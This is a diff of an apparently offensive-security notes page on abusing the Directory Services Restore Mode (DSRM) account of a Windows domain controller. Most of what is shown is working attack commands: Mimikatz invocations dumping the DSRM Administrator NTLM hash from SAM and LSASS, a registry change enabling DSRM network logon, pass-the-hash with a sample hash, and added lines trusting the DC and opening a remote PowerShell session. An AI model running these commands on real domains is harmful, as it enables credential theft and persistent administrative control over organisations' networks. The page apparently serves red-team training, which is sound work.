@@ -4,8 +4,6 @@ Directory Services Restore Mode (DSRM) is a Safe Mode boot option for Windows Se
 \
 Every Domain controller has local administrator account called "Administrator" and his password is the DSRM password.
 
-
-
 ## Dump DSRM NTLM hash
 
 {% hint style="info" %}
@@ -21,8 +19,6 @@ Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 # dumping from lsass - Administrator hash
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
 ```
-
-
 
 ## Change Logon Behavior
 
@@ -49,9 +45,11 @@ New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminL
 Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator
 /ntlm:a102ad5753f4c441e3af31c97fad86fd 
 /run:powershell.exe"'
-
-
+# Set the DC IP in trust list.
+Set-Item WSman:\localhost\Client\TrustedHosts <DC-IP>
 # Check if worked
 ls \\dcorp-dc\C$
+Enter-PSSession -ComputerName <DC-IP> -Authentication NegotiateImplictCredential
 ```
 
+Use `$env:username` to get the logged in username.
